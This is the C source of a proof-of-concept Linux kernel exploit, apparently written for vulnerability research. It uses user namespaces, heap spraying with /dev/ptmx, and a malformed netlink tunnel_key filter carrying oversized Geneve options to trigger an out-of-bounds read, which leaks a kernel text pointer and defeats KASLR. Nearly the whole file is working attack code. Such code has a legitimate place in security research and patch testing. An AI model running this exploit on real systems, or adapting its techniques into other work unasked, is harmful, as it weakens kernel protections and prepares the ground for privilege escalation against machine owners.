// gcc -g poc-leak.c -o poc-leak -lmnl
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sound/asound.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <sys/timerfd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <pthread.h>
#include <poll.h>
#include <sys/types.h> /* See NOTES */
#include <sys/socket.h>
#include <arpa/inet.h>

#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_cls.h>
#include <linux/tc_act/tc_tunnel_key.h>
#include <libmnl/libmnl.h>

#include "utils.h"

struct geneve_opt_hdr
{
    uint16_t opt_class;
    uint8_t type;
#ifdef __LITTLE_ENDIAN_BITFIELD
    uint8_t length : 5;
    uint8_t r3 : 1;
    uint8_t r2 : 1;
    uint8_t r1 : 1;
#else
    uint8_t r1 : 1;
    uint8_t r2 : 1;
    uint8_t r3 : 1;
    uint8_t length : 5;
#endif
};

// https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-3390_lts_cos_mitigation/docs/exploit.md#53-setup-namespaces
void unshare_setup(uid_t uid, gid_t gid)
{
    int err;
    int temp;
    char edit[0x100];

    err = unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);
    if (err)
    {
        errExit("unshare fail ... check namespace config");
    }

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

// https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-3390_lts_cos_mitigation/docs/exploit.md#54-pinning-the-cpu
void set_cpu_affinity(int cpu_n, pid_t pid)
{
    cpu_set_t *set = (cpu_set_t *)malloc(sizeof(cpu_set_t));

    CPU_ZERO(set);
    CPU_SET(cpu_n, set);

    if (sched_setaffinity(pid, sizeof(set), set) < 0)
    {
        perror("sched_setaffinity");
        return;
    }
    free(set);
}

// kmalloc-512, 8 objects a page
// everytime open ptmx. will create two ports !!!
#define LEAK_SPRAY_SLOT_NUM (16)
#define LEAK_SLOT_MUL (4)
int leak_fd[LEAK_SPRAY_SLOT_NUM * LEAK_SLOT_MUL];

void taint_setup()
{
    LOG_DEBUG("Start taint kmalloc-512 cache for leak interesting data");
    for (int i = 0; i < LEAK_SPRAY_SLOT_NUM * LEAK_SLOT_MUL; i++)
    {
        leak_fd[i] = open("/dev/ptmx", O_RDWR);
        if (leak_fd[i] < 0)
        {
            perror("open ptmx");
            break;
        }
    }
    usleep(100);
    // release every SLOT one, so every adjacent one could
    // poosibly be our taint data
    for (int i = 0; i < LEAK_SPRAY_SLOT_NUM; i++)
    {
        int index = i * LEAK_SLOT_MUL;
        if (leak_fd[index] > 0)
        {
            close(leak_fd[index]);
            leak_fd[index] = -1;
        }
    }
}

void taint_cleanup()
{
    for (int i = 0; i < LEAK_SPRAY_SLOT_NUM * LEAK_SLOT_MUL; i++)
    {
        if (leak_fd[i] > 0)
        {
            close(leak_fd[i]);
            leak_fd[i] = -1;
        }
    }
}

uint64_t kaslr_offset;

void prepare_oob_opts(struct nlmsghdr *nlh)
{
    uint8_t stack_buf[0x100] = {0};

    // craft array of LWTUNNEL_IP_OPTS_GENEVE
    // 0xfc = (0x80 + 0x4) + (0x74 + 0x4)
    struct nlattr *anchor = mnl_attr_nest_start(nlh, TCA_TUNNEL_KEY_ENC_OPTS_GENEVE);
    mnl_attr_put_u16(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_CLASS, 0);
    mnl_attr_put_u8(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_TYPE, 0);
    // the first option is just a lift, ok to be all zero
    mnl_attr_put(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_DATA, 0x74, stack_buf);
    mnl_attr_nest_end(nlh, anchor);
    // the second one (vulnerable)
    anchor = mnl_attr_nest_start(nlh, TCA_TUNNEL_KEY_ENC_OPTS_GENEVE);
    mnl_attr_put_u16(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_CLASS, 0);
    mnl_attr_put_u8(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_TYPE, 0);

    // remaining length is 0x84
    // leak layout, aim to leak as many as possible
    struct geneve_opt_hdr *gopt_hdr = (void *)stack_buf;
    gopt_hdr->length = (0x80 - 4 - 4) / 4;
    memset(gopt_hdr + 1, 'A', 0x80 - 4 - 4);
    gopt_hdr = (void *)(stack_buf + 0x80 - 4);
    gopt_hdr->length = (0x80 - 4) / 4; // max one
    mnl_attr_put(nlh, TCA_TUNNEL_KEY_ENC_OPT_GENEVE_DATA, 0x80, stack_buf);
    mnl_attr_nest_end(nlh, anchor);
}

bool attempt_leak()
{
    bool result;
    struct mnl_socket *rt_mnl_socket;
    struct nlmsghdr *nlh;
    struct tcmsg *tcmsgptr;
    char buf[MNL_SOCKET_BUFFER_SIZE];

    rt_mnl_socket = mnl_socket_open(NETLINK_ROUTE);
    if (!rt_mnl_socket)
        errExit("mnl_socket_open failed");

    // ??? does not work out, why multicast fails ???
    if (mnl_socket_bind(rt_mnl_socket, 1 << (RTNLGRP_TC - 1), MNL_SOCKET_AUTOPID))
        errExit("mnl_socket_bind failed");

    //    because our OOB read data is locate on kmalloc-512 cache (GFP_ATOMIC)
    //    hence, we need to place some interesting data in advance
    //    a. cross-cache, use our familiar object like pipe
    //    b. find same cache object which contains data
    taint_setup();

    memset(buf, 0, sizeof(buf));
    // * header
    nlh = mnl_nlmsg_put_header(buf);
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh->nlmsg_type = RTM_NEWTFILTER;
    nlh->nlmsg_pid = mnl_socket_get_portid(rt_mnl_socket);
    tcmsgptr = mnl_nlmsg_put_extra_header(nlh, sizeof(struct tcmsg));
    tcmsgptr->tcm_family = AF_UNSPEC;
    tcmsgptr->tcm_handle = 1;
    tcmsgptr->tcm_ifindex = 0x1; // TODO: query `lo` index instead
    tcmsgptr->tcm_parent = 0x10000;
    tcmsgptr->tcm_info = 0x640008;
    // * attrs - rtm_tca_policy
    mnl_attr_put_str(nlh, TCA_KIND, "fw");
    struct nlattr *anchor_tca_options = mnl_attr_nest_start(nlh, TCA_OPTIONS);
    // * attrs - fw_policy
    mnl_attr_put_u32(nlh, TCA_FW_CLASSID, 0x10010);
    // * attrs - tcf_action_policy
    struct nlattr *anchor_fw_act = mnl_attr_nest_start(nlh, TCA_FW_ACT);
    // * attrs - act array
    struct nlattr *anchor_act_1 = mnl_attr_nest_start(nlh, 1);
    mnl_attr_put_str(nlh, TCA_ACT_KIND, "tunnel_key");
    // * attrs - tunnel_key_policy
    struct nlattr *anchor_act_options = mnl_attr_nest_start(nlh, TCA_ACT_OPTIONS);
    struct tc_tunnel_key param = {0};
    param.index = 0; // 0 for auto index
    param.t_action = TCA_TUNNEL_KEY_ACT_SET;
    mnl_attr_put(nlh, TCA_TUNNEL_KEY_PARMS, sizeof(param), &param);
    in_addr_t ipv4_src, ipv4_dst;
    ipv4_src = inet_addr("8.8.8.8");
    ipv4_dst = inet_addr("9.9.9.9");
    mnl_attr_put(nlh, TCA_TUNNEL_KEY_ENC_IPV4_SRC, sizeof(ipv4_src), &ipv4_src);
    mnl_attr_put(nlh, TCA_TUNNEL_KEY_ENC_IPV4_DST, sizeof(ipv4_dst), &ipv4_src);

    // our main character, TCA_TUNNEL_KEY_ENC_OPTS
    struct nlattr *anchor_enc_opts = mnl_attr_nest_start(nlh, TCA_TUNNEL_KEY_ENC_OPTS);
    prepare_oob_opts(nlh);

    mnl_attr_nest_end(nlh, anchor_enc_opts);
    mnl_attr_nest_end(nlh, anchor_act_options);
    mnl_attr_nest_end(nlh, anchor_act_1);
    mnl_attr_nest_end(nlh, anchor_fw_act);
    mnl_attr_nest_end(nlh, anchor_tca_options);

    LOG_DEBUG("Prepare message length: %u (%x)", nlh->nlmsg_len, nlh->nlmsg_len);
#ifdef DEBUG
    printf("hex dump %d bytes\n", nlh->nlmsg_len);
    buffer2hex((char *)nlh, nlh->nlmsg_len);
    puts("");
#endif

    ssize_t sent = mnl_socket_sendto(rt_mnl_socket, nlh, nlh->nlmsg_len);
    if (sent < 0)
        errExit("mnl_socket_sendto for RTM_NEWTFILTER");
    else
        LOG_DEBUG("mnl_socket_sendto (RTM_NEWTFILTER) send %lu bytes", sent);

    // awesome, then what we need is *GET/DUMP*
    // fortunately, the new filter will awake `tfilter_notify`, and we have call
    // `bind` to this socket, guess we can receive the notificiation
    while (1)
    {
        // NOTE: by debugging, the first notify is `RTM_NEWCHAIN`
        memset(buf, 0, sizeof(buf));
        ssize_t received = mnl_socket_recvfrom(rt_mnl_socket, buf, sizeof(buf));
        // ssize_t received = recv(mnl_socket_get_fd(rt_mnl_socket), buf, sizeof(buf), MSG_DONTWAIT);
        LOG_DEBUG("mnl_socket_recvfrom got %lu bytes (tc_chain_notify)", received);

        nlh = (void *)buf;
        if (nlh->nlmsg_type == RTM_NEWTFILTER)
        {
#ifdef DEBUG
            printf("hex dump %ld bytes\n", received);
            buffer2hex(buf, received);
            puts("");
#endif
            uint64_t *suppose_leaked_ptr = (uint64_t *)(buf + 0x274);
            uint64_t oob_leaked_val = *suppose_leaked_ptr;
            if ((oob_leaked_val >> 32) == 0xfffffffful)
            {
                LOG_INFO("Leak one .text pointer successfully, val = %lx", oob_leaked_val);
                // 0xffffffff8181e720 <flush_to_ldisc>:	nop    DWORD PTR [rax+rax*1+0x0]
                result = true;
                goto cleanup;
            }
            else
            {
                LOG_ERROR("Failed to get .text pointer, try again...");
                result = false;
                goto cleanup;
            }
        }
        else
        {
            if (nlh->nlmsg_type == RTM_NEWCHAIN || nlh->nlmsg_type == RTM_DELCHAIN)
                continue;
            else
            {
                LOG_ERROR("Unexpected message type %x", nlh->nlmsg_type);
                result = false;
                goto cleanup;
            }
        }
    }

cleanup:

    // XXX: call RTM_DELTFILTER
    memset(buf, 0, sizeof(buf));
    nlh = mnl_nlmsg_put_header(buf);
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_type = RTM_DELTFILTER;
    nlh->nlmsg_pid = mnl_socket_get_portid(rt_mnl_socket);
    tcmsgptr = mnl_nlmsg_put_extra_header(nlh, sizeof(struct tcmsg));
    tcmsgptr->tcm_family = AF_UNSPEC;
    tcmsgptr->tcm_handle = 1;
    tcmsgptr->tcm_ifindex = 0x1; // TODO: query `lo` index instead
    tcmsgptr->tcm_parent = 0x10000;
    tcmsgptr->tcm_info = 0x640008;
    // no attributes need in deed
    sent = mnl_socket_sendto(rt_mnl_socket, nlh, nlh->nlmsg_len);
    if (sent < 0)
        errExit("mnl_socket_sendto for RTM_DELTFILTER");
    else
        LOG_DEBUG("mnl_socket_sendto (RTM_DELTFILTER) send %lu bytes", sent);

    // XXX: shall we receive message from this one?
    LOG_INFO("we should delete that buggy filter");
    taint_cleanup();
    mnl_socket_close(rt_mnl_socket);
    return result;
}

int main(int argc, char const *argv[])
{
    int err;
    bool success;

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    // 1) call unshare to enter into user namespaces
    unshare_setup(getuid(), getgid());
    LOG_DEBUG("finish unshare()");

    // 2) pin CPU
    set_cpu_affinity(0, 0);
    LOG_DEBUG("finish CPU pining");

    // 3) misc
    // a. brought up device
    err = system("ip link set lo up");
    if (err)
        errExit("fail `ip link set lo up`");

    // b. create qdisc
    err = system("tc qdisc add dev lo root handle 1: drr");
    if (err)
        errExit("fail `tc qdisc add dev lo root handle 1: drr`");

    // c. create class
    err = system("tc class add dev lo parent 1: classid 1:10 drr quantum 60");
    if (err)
        errExit("fail `tc class add dev lo parent 1: classid 1:10 drr quantum 60`");

    LOG_INFO("Ready to ROLL! > ENTER <");
    getchar();

    while (true)
    {
        success = attempt_leak();
        if (success)
            break;
    }

    // cleanup
    return 0;
}
